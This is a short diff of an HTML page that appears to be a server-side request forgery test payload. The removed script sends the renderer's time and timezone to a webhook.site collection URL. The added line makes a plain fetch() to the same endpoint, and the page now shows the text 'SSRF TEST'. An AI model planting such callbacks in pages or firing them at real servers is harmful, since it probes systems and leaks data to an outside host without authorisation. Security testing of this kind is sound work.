@@ -1,16 +1,8 @@
 <html>
 <body>
-
 <script>
-
-var serverTime = new Date().toString();
-var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-new Image().src =
-"https://webhook.site/c1c764a3-a349-44c6-a075-ae048e1e78dd/proof?" +
-encodeURIComponent("time="+serverTime+"&tz="+timezone);
-
+fetch("https://webhook.site/c1c764a3-a349-44c6-a075-ae048e1e78dd/js-test")
 </script>
-
+SSRF TEST
 </body>
 </html>
